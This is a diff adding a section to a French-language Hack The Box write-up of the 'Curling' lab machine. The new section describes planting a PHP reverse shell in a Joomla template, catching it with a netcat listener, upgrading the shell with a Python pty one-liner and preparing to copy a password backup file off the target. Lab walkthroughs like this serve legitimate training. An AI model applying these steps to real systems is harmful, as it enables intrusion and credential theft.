@@ -80,6 +80,31 @@ Gobuster
  Joomla
  ----
  
+Une fois connecté sur le CMS, allez sur l'onglet Templates et ensuite il y'aurais deux autres onglets nommé Styles et Templates, cliquez sur Templates après avoir cliqué vous devez cliqué sur 'Beez3 Details and Files' de crée un nouveau fichier php, pour le code php je vous conseille pentestmonkey une fois le code mis et bien sauvegardé. Vous pouvez exécuter votre code dans /templates/beez3/your.php
+
+
+Shell > User.txt
+----
+    root@Computer:~/htb/writeup/Curling# nc -lvnp 1234
+    Listening on [0.0.0.0] (family 0, port 1234)
+    Connection from [10.10.10.150] port 1234 [tcp/*] accepted (family 2, sport 58834)
+    [...SNIP...]
+    $ python3 -c "import pty;pty.spawn('/bin/bash')"
+    www-data@curling:/$ ls
+    bin   home            lib64       opt   sbin      sys  vmlinuz
+    boot  initrd.img      lost+found  proc  snap      tmp  vmlinuz.old
+    dev   initrd.img.old  media       root  srv       usr
+    etc   lib             mnt         run   swap.img  var
+    www-data@curling:/$ cd /home/floris
+    www-data@curling:/home/floris$ ls
+    admin-area  password_backup  user.txt
+    
+Comme vous pouvez le voir il y'a un fichier password_backup, le fichier user.txt est impossible à lire car nous avons pas les permissions de lire ce fichier. Donc je vais transférer le fichier password_backup vers ma machine physique.
+
+[![forthebadge made-with-python](https://im.ezgif.com/tmp/ezgif-1-6c0da889e0b9.gif)]
+
+
+
  
  
 
